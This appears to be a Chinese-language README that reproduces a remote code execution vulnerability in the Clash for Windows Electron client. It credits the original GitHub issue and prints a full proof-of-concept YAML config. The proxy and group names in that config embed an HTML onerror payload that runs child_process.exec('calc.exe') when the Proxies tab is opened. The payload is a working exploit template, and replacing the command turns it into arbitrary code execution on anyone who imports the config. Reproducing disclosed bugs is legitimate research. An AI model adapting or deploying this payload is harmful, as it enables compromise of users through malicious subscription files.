# Clash_for_Windows-
Clash_for_Windows远程代码执行漏洞
1. clash介绍

A Windows/macOS/Linux GUI based on Clash and Electron.

2. 漏洞复现

原漏洞发现作者pr链接：

https://github.com/Fndroid/clash_for_windows_pkg/issues/2710 里面包含了poc和复现方法。

本次本地复现来源于上述链接！

从以下链接下载Windows版本：
https://github.com/Fndroid/clash_for_windows_pkg/releases

在windows10虚拟机中打开：

2.2 poc

port: 7890
socks-port: 7891
allow-lan: true
mode: Rule
log-level: info
external-controller: :9090
proxies:
  - name: a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
    type: socks5
    server: 127.0.0.1
    port: "17938"
    skip-cert-verify: true
  - name: abc
    type: socks5
    server: 127.0.0.1
    port: "8088"
    skip-cert-verify: true

proxy-groups:
  -
    name: <img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
    type: select
    proxies:
    - a<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
    
    
    导入该poc：
    
    
    在当前界面点击：Proxies
    
    
    此时弹出计算器，漏洞利用成功。
